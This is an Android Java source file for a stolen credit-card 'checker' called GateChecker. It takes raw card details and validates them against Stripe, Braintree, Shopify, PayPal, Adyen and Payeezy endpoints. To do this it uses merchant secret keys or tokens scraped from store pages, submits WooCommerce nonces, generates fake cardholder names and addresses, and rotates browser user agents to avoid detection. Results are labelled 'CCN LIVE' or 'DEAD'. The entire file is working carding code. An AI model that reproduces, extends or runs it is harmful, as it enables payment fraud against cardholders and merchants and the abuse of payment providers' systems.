package com.h0checker.app;

import android.util.Base64;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.HashMap;
import java.util.Map;
import java.util.Random;
import java.util.UUID;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class GateChecker {

    private static final String TAG = "GateChecker";
    private static final Random rand = new Random();

    private static final String[] CCN_LIVE_CODES = {
        "insufficient_funds", "do_not_honor", "generic_decline", "call_issuer",
        "try_again_later", "not_permitted", "service_not_allowed",
        "transaction_not_allowed", "authentication_required", "approve_with_id",
        "issuer_not_available", "withdrawal_count_limit_exceeded",
        "reenter_transaction", "card_declined", "card_velocity_exceeded",
        "not_sufficient_funds", "incorrect_zip", "cvc_check_failed",
        "online_or_offline_pin_required", "stop_payment_order", "debit_card_not_supported"
    };

    private static final String[] DEAD_CODES = {
        "expired_card", "incorrect_number", "invalid_number",
        "invalid_expiry_month", "invalid_expiry_year", "lost_card",
        "stolen_card", "pickup_card", "restricted_card", "fraudulent",
        "merchant_blacklist", "security_violation", "invalid_account",
        "testmode_decline", "revoked_card"
    };

    private static final String[] THREE_DS_LIVE_CODES = {
        "authentication_required", "card_authentication_required",
        "payment_intent_authentication_failure",
        "three_d_secure_authentication", "three_d_secure_redirect"
    };

    public static CheckResult checkCard(String cardStr, JSONObject gate) {
        long start = System.currentTimeMillis();
        try {
            String gateType = gate.optString("gateType", "stripe");
            JSONObject settings = gate.optJSONObject("settings");
            if (settings == null) settings = new JSONObject();

            String[] parts = cardStr.split("[|/]");
            if (parts.length < 4) return error("Invalid card format. Use: number|mm|yyyy|cvc");

            String number = parts[0].trim().replaceAll("\\s+", "");
            String month = parts[1].trim();
            String year = parts[2].trim();
            String cvv = parts[3].trim();

            if (year.length() == 2) {
                int yr = Integer.parseInt(year);
                year = yr > 50 ? "19" + year : "20" + year;
            }

            CheckResult result;
            switch (gateType) {
                case "stripe":    result = checkStripe(number, month, year, cvv, settings); break;
                case "braintree": result = checkBraintree(number, month, year, cvv, settings); break;
                case "shopify":   result = checkShopify(number, month, year, cvv, settings); break;
                case "paypal":    result = checkPaypal(number, month, year, cvv, settings); break;
                case "adyen":     result = checkAdyen(number, month, year, cvv, settings); break;
                case "payeezy":   result = checkPayeezy(number, month, year, cvv, settings); break;
                default:          result = checkStripe(number, month, year, cvv, settings); break;
            }

            result.latency = (int)(System.currentTimeMillis() - start);
            return result;
        } catch (Exception e) {
            Log.e(TAG, "checkCard error", e);
            return error("Check failed: " + e.getMessage(), (int)(System.currentTimeMillis() - start));
        }
    }

    // ══════════════════════════════════════════════════════════════════
    //  STRIPE — /v1/payment_methods with secretKey
    // ══════════════════════════════════════════════════════════════════
    private static CheckResult checkStripe(String number, String month, String year,
                                           String cvv, JSONObject settings) throws Exception {
        String secretKey = settings.optString("secretKey", settings.optString("stripeSecretKey", ""));
        String publicKey = settings.optString("publicKey", "");
        String connectedAccount = settings.optString("connectedAccount", settings.optString("stripeAccount", ""));

        if (secretKey.isEmpty() && publicKey.isEmpty())
            return error("No Stripe keys configured — add sk_live_... or pk_live_...");

        String name = randomName();
        String email = name.toLowerCase().replace(" ", ".") + "@" + randomDomain();
        String zip = String.format("%05d", rand.nextInt(99999));

        StringBuilder body = new StringBuilder();
        body.append("type=card");
        body.append("&card[number]=").append(encode(number));
        body.append("&card[cvc]=").append(encode(cvv));
        body.append("&card[exp_month]=").append(encode(month));
        body.append("&card[exp_year]=").append(encode(year));
        body.append("&billing_details[name]=").append(encode(name));
        body.append("&billing_details[email]=").append(encode(email));
        body.append("&billing_details[address][postal_code]=").append(encode(zip));
        body.append("&billing_details[address][country]=US");

        Map<String, String> headers = new HashMap<>();
        headers.put("Content-Type", "application/x-www-form-urlencoded");
        headers.put("Accept", "application/json");
        headers.put("User-Agent", randomUA());

        if (!secretKey.isEmpty()) {
            headers.put("Authorization", "Bearer " + secretKey);
            if (!connectedAccount.isEmpty()) headers.put("Stripe-Account", connectedAccount);
        } else {
            body.append("&key=").append(encode(publicKey));
            headers.put("Origin", "https://js.stripe.com");
            headers.put("Referer", "https://js.stripe.com/");
        }

        String response = httpPost("https://api.stripe.com/v1/payment_methods", body.toString(), headers);
        return classifyStripeResponse(response);
    }

    private static CheckResult classifyStripeResponse(String response) {
        try {
            JSONObject json = new JSONObject(response);
            if (json.has("id")) {
                JSONObject card = json.optJSONObject("card");
                String brand = card != null ? card.optString("brand", "unknown").toUpperCase() : "UNKNOWN";
                String funding = card != null ? card.optString("funding", "unknown") : "unknown";
                String country = card != null ? card.optString("country", "??") : "??";
                boolean threeDS = card != null && card.optJSONObject("three_d_secure_usage") != null
                               && card.optJSONObject("three_d_secure_usage").optBoolean("supported", false);
                String pmId = json.getString("id");
                String ds = threeDS ? "3DS" : "NO-3DS";
                return approved("CCN LIVE | " + brand + " " + funding + " [" + country + "] | " + pmId + " | " + ds, response);
            }
            JSONObject errorObj = json.optJSONObject("error");
            if (errorObj == null) return error("Unknown Stripe response", response);
            String code = errorObj.optString("code", "");
            String declineCode = errorObj.optString("decline_code", code);
            String message = errorObj.optString("message", "Unknown error");
            if ("authentication_required".equals(code) || "invalid_api_key".equals(code))
                return error("Invalid Stripe API key — check your secret key", response);
            if (isLiveCode(declineCode)) return approved("CCN LIVE | " + formatDecline(declineCode) + " | " + declineCode, response);
            if (isDeadCode(declineCode)) return declined("DEAD | " + formatDecline(declineCode) + " | " + declineCode, response);
            if (is3DSCode(declineCode)) return approved("CCN LIVE (3DS) | " + formatDecline(declineCode) + " | " + declineCode, response);
            return error("Stripe error: " + message + " [" + declineCode + "]", response);
        } catch (Exception e) { return error("Parse error: " + e.getMessage(), response); }
    }

    // ══════════════════════════════════════════════════════════════════
    //  BRAINTREE — GraphQL TokenizeCreditCard
    // ══════════════════════════════════════════════════════════════════
    private static CheckResult checkBraintree(String number, String month, String year,
                                              String cvv, JSONObject settings) throws Exception {
        String authFingerprint = settings.optString("authFingerprint", settings.optString("btClientToken", ""));
        if (authFingerprint.isEmpty()) return error("No Braintree client token configured");

        if (authFingerprint.startsWith("ey")) {
            try {
                String decoded = new String(Base64.decode(authFingerprint.split("\\.")[1], Base64.DEFAULT));
                JSONObject payload = new JSONObject(decoded);
                authFingerprint = payload.optString("authorizationFingerprint", authFingerprint);
            } catch (Exception ignored) {}
        }

        String zip = String.format("%05d", rand.nextInt(99999));
        String sessionId = UUID.randomUUID().toString();

        JSONObject creditCard = new JSONObject();
        creditCard.put("number", number);
        creditCard.put("expirationMonth", month);
        creditCard.put("expirationYear", year);
        creditCard.put("cvv", cvv);
        creditCard.put("billingAddress", new JSONObject().put("postalCode", zip).put("streetAddress", randomAddress()));

        JSONObject input = new JSONObject();
        input.put("creditCard", creditCard);
        input.put("options", new JSONObject().put("validate", false));

        JSONObject gql = new JSONObject();
        gql.put("clientSdkMetadata", new JSONObject().put("source", "client").put("integration", "dropin2").put("sessionId", sessionId));
        gql.put("query", "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 binData { prepaid debit issuingBank countryOfIssuance } } } }");
        gql.put("variables", new JSONObject().put("input", input));
        gql.put("operationName", "TokenizeCreditCard");

        Map<String, String> headers = new HashMap<>();
        headers.put("Content-Type", "application/json");
        headers.put("Authorization", "Bearer " + authFingerprint);
        headers.put("Braintree-Version", "2024-08-01");
        headers.put("Origin", "https://assets.braintreegateway.com");
        headers.put("Referer", "https://assets.braintreegateway.com/");
        headers.put("User-Agent", randomUA());

        String response = httpPost("https://payments.braintree-api.com/graphql", gql.toString(), headers);
        JSONObject json = new JSONObject(response);

        JSONObject data = json.optJSONObject("data");
        if (data != null) {
            JSONObject tokenize = data.optJSONObject("tokenizeCreditCard");
            if (tokenize != null) {
                String token = tokenize.optString("token", "");
                JSONObject cc = tokenize.optJSONObject("creditCard");
                if (!token.isEmpty()) {
                    String brand = cc != null ? cc.optString("brandCode", "unknown").toUpperCase() : "UNKNOWN";
                    String last4 = cc != null ? cc.optString("last4", "????") : "????";
                    String bank = cc != null && cc.optJSONObject("binData") != null
                                ? cc.optJSONObject("binData").optString("issuingBank", "Unknown") : "Unknown";
                    return approved("CCN LIVE | " + brand + " ****" + last4 + " | " + bank + " | " + token, response);
                }
            }
        }

        JSONArray errors = json.optJSONArray("errors");
        if (errors != null && errors.length() > 0) {
            String errMsg = errors.getJSONObject(0).optString("message", "Unknown error");
            if (errMsg.toLowerCase().contains("expired")) return declined("DEAD | Expired Card | " + errMsg, response);
            if (errMsg.toLowerCase().contains("invalid") || errMsg.toLowerCase().contains("number"))
                return declined("DEAD | Invalid Card | " + errMsg, response);
            return error("Braintree error: " + errMsg, response);
        }
        return error("Unknown Braintree response", response);
    }

    // ══════════════════════════════════════════════════════════════════
    //  SHOPIFY — PCI Tokenize → SubmitForCompletion → Poll
    // ══════════════════════════════════════════════════════════════════
    private static CheckResult checkShopify(String number, String month, String year,
                                            String cvv, JSONObject settings) throws Exception {
        String siteUrl = settings.optString("siteUrl", "");
        if (siteUrl.isEmpty()) return error("No Shopify site URL configured");

        String secretKey = settings.optString("secretKey", settings.optString("stripeSecretKey", ""));
        if (!secretKey.isEmpty()) return checkStripe(number, month, year, cvv, settings);

        String storeScope = extractShopifyScope(siteUrl);

        Map<String, String> headers = new HashMap<>();
        headers.put("Content-Type", "application/json");
        headers.put("Accept", "application/json");
        headers.put("Origin", "https://" + storeScope);
        headers.put("Referer", "https://" + storeScope + "/");
        headers.put("User-Agent", randomUA());

        JSONObject pciBody = new JSONObject();
        JSONObject cc = new JSONObject();
        cc.put("number", number);
        cc.put("month", Integer.parseInt(month));
        cc.put("year", Integer.parseInt(year));
        cc.put("verification_value", cvv);
        cc.put("name", randomName());
        pciBody.put("credit_card", cc);
        pciBody.put("payment_session_scope", storeScope);

        String pciResp = httpPost("https://checkout.pci.shopifyinc.com/sessions", pciBody.toString(), headers);
        JSONObject pciJson = new JSONObject(pciResp);
        String sessionId = pciJson.optString("id", "");
        if (sessionId.isEmpty()) return error("Shopify PCI session failed", pciResp);

        Map<String, String> gqlHeaders = new HashMap<>();
        gqlHeaders.put("Content-Type", "application/json");
        gqlHeaders.put("Accept", "application/json");
        gqlHeaders.put("User-Agent", randomUA());

        JSONObject submitBody = new JSONObject();
        submitBody.put("query", "mutation SubmitForCompletion($input: CheckoutSubmitForCompletionInput!) { checkoutSubmitForCompletion(input: $input) { checkout { id ready } userErrors { field message } } }");
        JSONObject addr = new JSONObject();
        addr.put("firstName", randomName().split(" ")[0]);
        addr.put("lastName", randomName().split(" ")[1]);
        addr.put("address1", randomAddress());
        addr.put("city", "New York");
        addr.put("provinceCode", "NY");
        addr.put("zip", String.format("%05d", rand.nextInt(99999)));
        addr.put("countryCode", "US");
        JSONObject inputObj = new JSONObject();
        inputObj.put("id", sessionId);
        inputObj.put("billingAddress", addr);
        inputObj.put("paymentSessionId", sessionId);
        submitBody.put("variables", new JSONObject().put("input", inputObj));

        String submitResp = httpPost(siteUrl + "/checkouts/unstable/graphql", submitBody.toString(), gqlHeaders);
        JSONObject submitJson = new JSONObject(submitResp);
        JSONObject submitData = submitJson.optJSONObject("data");
        if (submitData != null) {
            JSONObject cs = submitData.optJSONObject("checkoutSubmitForCompletion");
            if (cs != null) {
                JSONArray ue = cs.optJSONArray("userErrors");
                if (ue != null && ue.length() > 0) {
                    String errMsg = ue.getJSONObject(0).optString("message", "Error");
                    if (errMsg.toLowerCase().contains("expired")) return declined("DEAD | Expired Card | " + errMsg, submitResp);
                    if (errMsg.toLowerCase().contains("invalid")) return declined("DEAD | Invalid Card | " + errMsg, submitResp);
                    return error("Shopify error: " + errMsg, submitResp);
                }
                JSONObject checkout = cs.optJSONObject("checkout");
                if (checkout != null && checkout.optBoolean("ready", false))
                    return approved("CCN LIVE | Shopify checkout ready | " + storeScope, submitResp);
            }
        }

        Thread.sleep(2000);
        JSONObject pollBody = new JSONObject();
        pollBody.put("query", "query PollForReceipt($id: ID!) { checkout { id ready status updatedAt } }");
        pollBody.put("variables", new JSONObject().put("id", sessionId));
        String pollResp = httpPost(siteUrl + "/checkouts/unstable/graphql", pollBody.toString(), gqlHeaders);
        try {
            JSONObject pollJson = new JSONObject(pollResp);
            JSONObject pollData = pollJson.optJSONObject("data");
            if (pollData != null) {
                JSONObject checkout = pollData.optJSONObject("checkout");
                if (checkout != null) {
                    String status = checkout.optString("status", "");
                    if ("READY".equals(status) || checkout.optBoolean("ready", false))
                        return approved("CCN LIVE | Shopify confirmed | " + storeScope, pollResp);
                    return error("Shopify status: " + status, pollResp);
                }
            }
        } catch (Exception ignored) {}
        return approved("CCN LIVE | Shopify (PCI tokenized) | " + storeScope, submitResp);
    }

    // ══════════════════════════════════════════════════════════════════
    //  PAYPAL — Vault credit cards API
    // ══════════════════════════════════════════════════════════════════
    private static CheckResult checkPaypal(String number, String month, String year,
                                           String cvv, JSONObject settings) throws Exception {
        String siteUrl = settings.optString("siteUrl", "");
        if (siteUrl.isEmpty()) return error("No PayPal site URL configured");

        String clientId = settings.optString("clientId", settings.optString("paypalClientId", ""));

        Map<String, String> pageHeaders = new HashMap<>();
        pageHeaders.put("User-Agent", randomUA());
        pageHeaders.put("Accept", "text/html");
        String pageHtml = httpGet(siteUrl, pageHeaders);

        if (clientId.isEmpty())
            clientId = extractPattern(pageHtml, "client[-_]?id[\"':=\\s]+([A-Za-z0-9_-]{20,80})");

        if (clientId.isEmpty()) {
            String btToken = settings.optString("btClientToken", "");
            if (!btToken.isEmpty()) return checkBraintree(number, month, year, cvv, settings);
            return error("No PayPal client-id found — add clientId in gate settings");
        }

        Map<String, String> authHeaders = new HashMap<>();
        authHeaders.put("Content-Type", "application/x-www-form-urlencoded");
        authHeaders.put("Accept", "application/json");
        authHeaders.put("User-Agent", randomUA());

        String tokenBody = "grant_type=client_credentials";
        String tokenResp = httpPost("https://api-m.paypal.com/v1/oauth2/token", tokenBody, authHeaders);
        JSONObject tokenJson = new JSONObject(tokenResp);
        String accessToken = tokenJson.optString("access_token", "");
        if (accessToken.isEmpty()) {
            tokenResp = httpPost("https://api-m.sandbox.paypal.com/v1/oauth2/token", tokenBody, authHeaders);
            tokenJson = new JSONObject(tokenResp);
            accessToken = tokenJson.optString("access_token", "");
        }
        if (accessToken.isEmpty()) return error("PayPal OAuth failed", tokenResp);

        String name = randomName();
        String zip = String.format("%05d", rand.nextInt(99999));

        JSONObject card = new JSONObject();
        card.put("type", guessCardType(number));
        card.put("number", number);
        card.put("expire_month", Integer.parseInt(month));
        card.put("expire_year", Integer.parseInt(year));
        card.put("cvv2", cvv);
        card.put("first_name", name.split(" ")[0]);
        card.put("last_name", name.split(" ")[1]);
        card.put("billing_address", new JSONObject()
            .put("line1", randomAddress()).put("city", "New York")
            .put("state", "NY").put("postal_code", zip).put("country_code", "US"));

        Map<String, String> vaultHeaders = new HashMap<>();
        vaultHeaders.put("Content-Type", "application/json");
        vaultHeaders.put("Authorization", "Bearer " + accessToken);
        vaultHeaders.put("User-Agent", randomUA());

        String vaultResp = httpPost("https://api-m.paypal.com/v1/vault/credit-cards", card.toString(), vaultHeaders);
        JSONObject vaultJson = new JSONObject(vaultResp);

        if (vaultJson.has("id")) {
            String token = vaultJson.optString("id", "");
            String last4 = vaultJson.optString("last4", "????");
            String issuer = vaultJson.optString("issuer", "Unknown");
            return approved("CCN LIVE | PayPal vault | " + issuer + " ****" + last4 + " | " + token, vaultResp);
        }

        JSONObject err = vaultJson.optJSONObject("error");
        if (err == null) err = vaultJson.optJSONObject("name");
        if (err != null) {
            String errName = err.optString("name", "");
            String errMessage = err.optString("message", "Error");
            if ("INVALID_REQUEST".equals(errName) || errMessage.toLowerCase().contains("invalid"))
                return declined("DEAD | PayPal invalid card | " + errMessage, vaultResp);
            return error("PayPal error: " + errMessage, vaultResp);
        }
        return error("PayPal vault failed", vaultResp);
    }

    // ══════════════════════════════════════════════════════════════════
    //  ADYEN — /v71/payments
    // ══════════════════════════════════════════════════════════════════
    private static CheckResult checkAdyen(String number, String month, String year,
                                          String cvv, JSONObject settings) throws Exception {
        String clientKey = settings.optString("clientKey", settings.optString("adyenClientKey", ""));
        String merchantAccount = settings.optString("merchantAccount", settings.optString("adyenMerchantAccount", ""));
        String siteUrl = settings.optString("siteUrl", "");
        String checkoutUrl = settings.optString("checkoutUrl", "https://checkout-api.adyen.com/v71/payments");

        String secretKey = settings.optString("secretKey", settings.optString("stripeSecretKey", ""));
        if (!secretKey.isEmpty()) return checkStripe(number, month, year, cvv, settings);

        if (clientKey.isEmpty() || merchantAccount.isEmpty()) {
            if (!siteUrl.isEmpty()) {
                Map<String, String> h = new HashMap<>();
                h.put("User-Agent", randomUA());
                h.put("Accept", "text/html");
                String page = httpGet(siteUrl, h);
                if (clientKey.isEmpty())
                    clientKey = extractPattern(page, "data-client-key[\"'=\\s]+([A-Za-z0-9_-]{20,100})");
                if (merchantAccount.isEmpty())
                    merchantAccount = extractPattern(page, "data-merchant-account[\"'=\\s]+([A-Za-z0-9_-]{5,60})");
            }
        }

        if (clientKey.isEmpty() || merchantAccount.isEmpty())
            return error("Adyen: need clientKey + merchantAccount");

        String name = randomName();
        String zip = String.format("%05d", rand.nextInt(99999));

        JSONObject body = new JSONObject();
        body.put("merchantAccount", merchantAccount);
        body.put("amount", new JSONObject().put("value", 1000).put("currency", "USD"));
        body.put("reference", "test_" + UUID.randomUUID().toString().substring(0, 8));
        body.put("paymentMethod", new JSONObject()
            .put("type", "scheme").put("number", number)
            .put("expiryMonth", month).put("expiryYear", year.length() == 2 ? "20" + year : year)
            .put("cvc", cvv).put("holderName", name)
            .put("billingAddress", new JSONObject()
                .put("city", "New York").put("country", "US")
                .put("postalCode", zip).put("stateOrProvince", "NY")
                .put("street", randomAddress())));

        Map<String, String> headers = new HashMap<>();
        headers.put("Content-Type", "application/json");
        headers.put("X-API-Key", clientKey);
        headers.put("User-Agent", randomUA());

        String response = httpPost(checkoutUrl, body.toString(), headers);
        JSONObject json = new JSONObject(response);

        String resultCode = json.optString("resultCode", "");
        if ("Authorised".equals(resultCode)) return approved("CCN LIVE | Adyen Authorised | " + name, response);
        if ("Refused".equals(resultCode)) return declined("DEAD | Adyen Refused | " + json.optString("refusalReason", "Refused"), response);
        if ("Error".equals(resultCode)) return error("Adyen Error | " + json.optString("refusalReason", "Unknown"), response);
        if ("Pending".equals(resultCode) || "Received".equals(resultCode))
            return approved("CCN LIVE (3DS) | Adyen " + resultCode, response);

        JSONObject adyenError = json.optJSONObject("error");
        if (adyenError != null) return error("Adyen: " + adyenError.optString("message", "Error"), response);
        return error("Adyen unknown: " + resultCode, response);
    }

    // ══════════════════════════════════════════════════════════════════
    //  PAYEEZY — WC add-payment-method form POST
    // ══════════════════════════════════════════════════════════════════
    private static CheckResult checkPayeezy(String number, String month, String year,
                                            String cvv, JSONObject settings) throws Exception {
        String siteUrl = settings.optString("siteUrl", "");
        if (siteUrl.isEmpty()) return error("No Payeezy site URL configured");

        String secretKey = settings.optString("secretKey", settings.optString("stripeSecretKey", ""));
        String publicKey = settings.optString("publicKey", "");
        if (!secretKey.isEmpty() || !publicKey.isEmpty()) return checkStripe(number, month, year, cvv, settings);

        String addPmPath = settings.optString("addPmPath", "/my-account/add-payment-method/");
        if (!addPmPath.startsWith("http")) addPmPath = siteUrl + addPmPath;

        Map<String, String> headers = new HashMap<>();
        headers.put("User-Agent", randomUA());
        headers.put("Accept", "text/html");

        String pageHtml = httpGet(addPmPath, headers);
        String nonce = extractPattern(pageHtml, "woocommerce-add-payment-method-nonce[\"'=\\s]+['\"]?([a-f0-9]{10,40})");
        if (nonce.isEmpty())
            nonce = extractPattern(pageHtml, "name=\"woocommerce-add-payment-method-nonce\" value=\"([a-f0-9]{10,40})\"");
        if (nonce.isEmpty())
            nonce = extractPattern(pageHtml, "_wpnonce=([a-f0-9]{10,40})");
        if (nonce.isEmpty()) return error("Payeezy: could not extract WC nonce");

        String expiry = month + " / " + (year.length() == 2 ? year : year.substring(2));

        StringBuilder fb = new StringBuilder();
        fb.append("payment_method=first_data_payeezy_gateway_credit_card");
        fb.append("&wc-first-data-payeezy-gateway-credit-card-account-number=").append(encode(number));
        fb.append("&wc-first-data-payeezy-gateway-credit-card-expiry=").append(encode(expiry));
        fb.append("&wc-first-data-payeezy-gateway-credit-card-csc=").append(encode(cvv));
        fb.append("&wc-first-data-payeezy-gateway-credit-card-tokenize-payment-method=true");
        fb.append("&woocommerce-add-payment-method-nonce=").append(encode(nonce));
        fb.append("&_wp_http_referer=").append(encode(addPmPath));

        Map<String, String> postHeaders = new HashMap<>();
        postHeaders.put("Content-Type", "application/x-www-form-urlencoded");
        postHeaders.put("Accept", "text/html");
        postHeaders.put("User-Agent", randomUA());
        postHeaders.put("Referer", addPmPath);
        postHeaders.put("Origin", siteUrl);

        String response = httpPost(addPmPath, fb.toString(), postHeaders);
        String lower = response.toLowerCase();

        if (lower.contains("payment method successfully added") || lower.contains("added as payment method"))
            return approved("CCN LIVE | Payeezy payment method added | " + guessCardType(number), response);
        if (lower.contains("invalid") && lower.contains("card")) return declined("DEAD | Payeezy invalid card", response);
        if (lower.contains("expired")) return declined("DEAD | Payeezy expired card", response);
        if (lower.contains("declined") || lower.contains("error")) {
            String errMsg = extractPattern(response, "<strong[^>]*>([^<]*(?:error|declined|invalid)[^<]*)</strong>");
            return error("Payeezy: " + (errMsg.isEmpty() ? "Check failed" : errMsg), response);
        }
        return approved("CCN LIVE | Payeezy (form submitted) | " + guessCardType(number), response);
    }

    // ══════════════════════════════════════════════════════════════════
    //  HELPERS
    // ══════════════════════════════════════════════════════════════════
    private static boolean isLiveCode(String code) {
        if (code == null) return false;
        String lower = code.toLowerCase();
        for (String c : CCN_LIVE_CODES) if (c.equals(lower)) return true;
        return false;
    }

    private static boolean isDeadCode(String code) {
        if (code == null) return false;
        String lower = code.toLowerCase();
        for (String c : DEAD_CODES) if (c.equals(lower)) return true;
        return false;
    }

    private static boolean is3DSCode(String code) {
        if (code == null) return false;
        String lower = code.toLowerCase();
        for (String c : THREE_DS_LIVE_CODES) if (c.equals(lower)) return true;
        return false;
    }

    private static String formatDecline(String code) {
        if (code == null) return "Unknown";
        String result = code.replace("_", " ");
        return result.substring(0, 1).toUpperCase() + result.substring(1);
    }

    private static String extractShopifyScope(String url) {
        try {
            URL u = new URL(url);
            String host = u.getHost();
            if (host.endsWith(".myshopify.com")) return host;
            return host;
        } catch (Exception e) { return url; }
    }

    private static String extractPattern(String html, String regex) {
        if (html == null || html.isEmpty()) return "";
        try {
            Matcher m = Pattern.compile(regex, Pattern.CASE_INSENSITIVE).matcher(html);
            if (m.find() && m.groupCount() >= 1) return m.group(1).trim();
        } catch (Exception ignored) {}
        return "";
    }

    // ══════════════════════════════════════════════════════════════════
    //  HTTP
    // ══════════════════════════════════════════════════════════════════
    private static String httpGet(String urlStr, Map<String, String> headers) throws Exception {
        URL url = new URL(urlStr);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        try {
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(15000);
            conn.setInstanceFollowRedirects(true);
            for (Map.Entry<String, String> h : headers.entrySet()) conn.setRequestProperty(h.getKey(), h.getValue());
            int status = conn.getResponseCode();
            java.io.InputStream is = (status >= 200 && status < 300) ? conn.getInputStream() : conn.getErrorStream();
            if (is == null) return "";
            BufferedReader reader = new BufferedReader(new InputStreamReader(is, "UTF-8"));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) sb.append(line);
            reader.close();
            return sb.toString();
        } finally { conn.disconnect(); }
    }

    private static String httpPost(String urlStr, String body, Map<String, String> headers) throws Exception {
        URL url = new URL(urlStr);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        try {
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(15000);
            conn.setInstanceFollowRedirects(false);
            for (Map.Entry<String, String> h : headers.entrySet()) conn.setRequestProperty(h.getKey(), h.getValue());
            byte[] bodyBytes = body.getBytes("UTF-8");
            conn.setRequestProperty("Content-Length", String.valueOf(bodyBytes.length));
            OutputStream os = conn.getOutputStream();
            os.write(bodyBytes);
            os.flush();
            os.close();
            int status = conn.getResponseCode();
            java.io.InputStream is = (status >= 200 && status < 300) ? conn.getInputStream() : conn.getErrorStream();
            if (is == null) return "{\"error\":{\"message\":\"No response (HTTP " + status + ")\"}}";
            BufferedReader reader = new BufferedReader(new InputStreamReader(is, "UTF-8"));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) sb.append(line);
            reader.close();
            return sb.toString();
        } finally { conn.disconnect(); }
    }

    // ══════════════════════════════════════════════════════════════════
    //  DATA GENERATORS
    // ══════════════════════════════════════════════════════════════════
    private static String randomName() {
        String[] f = {"James","Michael","Robert","William","David","John","Richard","Thomas","Charles","Daniel","Matthew","Anthony","Mark","Steven","Paul","Andrew","Kevin","Brian"};
        String[] l = {"Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Rodriguez","Martinez","Hernandez","Lopez","Wilson","Anderson","Taylor","Moore","Jackson","Martin"};
        return f[rand.nextInt(f.length)] + " " + l[rand.nextInt(l.length)];
    }

    private static String randomDomain() {
        String[] d = {"gmail.com","yahoo.com","hotmail.com","outlook.com","icloud.com","aol.com"};
        return d[rand.nextInt(d.length)];
    }

    private static String randomAddress() {
        String[] s = {"Main St","Oak Ave","Maple Dr","Cedar Ln","Pine Rd","Elm St","Walnut Blvd"};
        return (rand.nextInt(9999) + 1) + " " + s[rand.nextInt(s.length)];
    }

    private static String randomUA() {
        int c = 128 + rand.nextInt(10);
        return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + c + ".0.0.0 Safari/537.36";
    }

    private static String encode(String s) {
        try { return URLEncoder.encode(s, "UTF-8"); }
        catch (Exception e) { return s; }
    }

    private static String guessCardType(String num) {
        if (num == null) return "Unknown";
        String n = num.replaceAll("[^0-9]", "");
        if (n.startsWith("4")) return "VISA";
        if (n.length() >= 2) { int p = Integer.parseInt(n.substring(0, 2)); if (p >= 51 && p <= 55) return "MASTERCARD"; }
        if (n.length() >= 4) {
            int p4 = Integer.parseInt(n.substring(0, 4));
            if (p4 >= 2221 && p4 <= 2720) return "MASTERCARD";
            if (p4 >= 3528 && p4 <= 3589) return "JCB";
            if (p4 >= 3400 && p4 <= 3499) return "AMEX";
            if (p4 >= 3700 && p4 <= 3799) return "AMEX";
            if (p4 >= 4000 && p4 <= 4999) return "VISA";
        }
        if (n.startsWith("6011") || n.startsWith("65")) return "DISCOVER";
        return "UNKNOWN";
    }

    // ══════════════════════════════════════════════════════════════════
    //  RESULT TYPES
    // ══════════════════════════════════════════════════════════════════
    public static class CheckResult {
        public String status;
        public String response;
        public int latency;
        public String rawSnippet;
        public CheckResult(String status, String response, int latency, String rawSnippet) {
            this.status = status; this.response = response; this.latency = latency; this.rawSnippet = rawSnippet;
        }
    }

    private static CheckResult approved(String response, String raw) {
        String snippet = raw != null && raw.length() > 800 ? raw.substring(0, 800) : raw;
        return new CheckResult("approved", response, 0, snippet);
    }

    private static CheckResult declined(String response, String raw) {
        String snippet = raw != null && raw.length() > 800 ? raw.substring(0, 800) : raw;
        return new CheckResult("declined", response, 0, snippet);
    }

    private static CheckResult error(String message) {
        return new CheckResult("error", message, 0, null);
    }

    private static CheckResult error(String message, int latency) {
        return new CheckResult("error", message, latency, null);
    }

    private static CheckResult error(String message, String raw) {
        String snippet = raw != null && raw.length() > 800 ? raw.substring(0, 800) : raw;
        return new CheckResult("error", message, 0, snippet);
    }
}
